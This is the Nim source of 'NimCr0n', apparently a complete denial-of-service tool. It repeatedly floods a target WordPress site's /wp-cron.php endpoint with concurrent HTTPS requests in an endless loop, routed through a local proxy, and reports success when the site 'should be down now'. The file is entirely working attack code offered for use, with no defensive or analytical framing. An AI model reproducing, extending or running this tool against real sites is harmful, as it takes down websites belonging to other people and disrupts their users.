# Dependencies
import std/[asyncdispatch, strutils, httpclient, net, os]

# Functions
proc attack(domain:string): Future[void] {.async.} =
    var client = newAsyncHttpClient(sslContext = newContext(verifyMode=CVerifyPeer), proxy = newProxy("http://127.0.0.1:9080"), userAgent = domain)

    try:
        discard await client.getContent("https://" & domain & "/wp-cron.php")
        echo "\x1b[36m[Nimcr0n]\x1b[0m" & " Success! " & domain & " should be down now."
    except:
        echo "\x1b[31m[Nimcr0n]\x1b[0m" & " Failed! 0-0"
    finally:
        client.close()

# Main
proc main() {.async} =
    if paramCount() > 0:
        let domain:string = paramStr(1)
        let concurrent:int = parseInt(paramStr(2))

        while true:
            var tasks: seq[Future[void]] = @[]

            for i in 0..<concurrent:
                tasks.add(attack(domain))

            await all(tasks)
            await sleepAsync(1)
    else:
        echo "\x1b[36m[Nimcr0n]\x1b[0m Usage: nimcr0n <domain> <concurrent>\n\x1b[36m[Nimcr0n]\x1b[0m Example: nimcr0n example.ph 100"

echo """
NimCr0n
by NCryptsion
"""

waitFor main()